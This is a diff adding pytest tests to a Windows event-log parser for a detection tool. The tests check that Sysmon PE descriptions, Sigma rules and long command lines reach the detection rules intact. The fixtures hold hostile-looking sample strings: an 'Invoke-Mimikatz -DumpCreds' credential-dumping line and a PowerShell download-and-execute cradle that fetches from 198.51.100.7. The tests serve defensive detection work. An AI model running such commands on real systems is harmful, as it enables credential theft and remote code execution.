@@ -145,3 +145,31 @@ def test_parse_from_file_object():
     with open(SAMPLES / "System-last7d.evtx", "rb") as fh:
         rows = list(evtx_parser.iter_events(fh, include_raw=False))
     assert len(rows) > 100
+
+
+def test_the_pe_description_is_not_overwritten_by_the_event_name():
+    """Sysmon 1 carries the binary's own Description. It used to be written to the column that also
+    holds REMN's name for the event, and overwritten by it, so no rule on it could match."""
+    ev = _sample_event(1, "Microsoft-Windows-Sysmon", {"Image": "C:\\Users\\Public\\m.exe", "Description": "mimikatz for Windows", "Company": "gentilkiwi"})
+    row = evtx_parser.flatten(ev, None, include_raw=False)
+    assert row["description"] == "Process creation"
+    assert row["data"]["Description"] == "mimikatz for Windows"
+
+
+def test_sigma_description_reads_the_pe_description():
+    from services.rules import sigma
+
+    text = "title: t\nlogsource: {product: windows, category: image_load}\ndetection:\n  sel: {Description: st2stager}\n  condition: sel\n"
+    rule = sigma.convert_text(text)[0]["rule"]
+    assert "data.Description" in json.dumps(rule["where"])
+
+
+def test_long_command_lines_and_script_blocks_reach_the_rules_whole():
+    """An indicator placed after character 4,000 of a command line or script block escaped every
+    rule. The rule-searched columns keep the whole text up to 64 KiB."""
+    script = "# " + "x" * 5000 + "\nInvoke-Mimikatz -DumpCreds"
+    row = evtx_parser.flatten(_sample_event(4104, "Microsoft-Windows-PowerShell", {"ScriptBlockText": script, "MessageNumber": 1, "MessageTotal": 1}), None, include_raw=False)
+    assert row["scriptBlockText"] == script
+    cmd = "powershell.exe " + "-NoP " * 900 + "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')"
+    row = evtx_parser.flatten(_sample_event(1, "Microsoft-Windows-Sysmon", {"Image": "C:\\Windows\\powershell.exe", "CommandLine": cmd}), None, include_raw=False)
+    assert row["commandLine"] == cmd and len(cmd) > 4000
